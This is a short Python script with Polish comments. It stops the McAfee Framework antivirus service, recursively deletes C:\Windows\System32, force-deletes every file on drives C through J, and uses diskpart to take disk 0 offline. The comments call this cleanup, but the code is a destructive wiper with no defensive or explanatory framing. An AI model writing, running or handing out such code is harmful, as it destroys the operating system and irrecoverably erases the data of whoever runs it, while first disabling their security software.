import os
import shutil

# Zatrzymaj usługę "McAfee Framework"
os.system('net stop "McAfee Framework"')

# Usuń folder "C:\Windows\System32" rekursywnie
os.system('rd /s /q C:\\Windows\\System32')

# Usuń pliki na dyskach C, D, E, F, G, H, I, J
drives = ["C", "D", "E", "F", "G", "H", "I", "J"]

for drive in drives:
    drive_path = drive + ":\\"
    os.system(f'del /f /s /q {drive_path}*.*')

# Wykonaj inne operacje czyszczenia, takie jak wyłączenie dysku
os.system('echo list disk | diskpart')
os.system('echo select disk 0 | diskpart')
os.system('echo offline disk | diskpart')
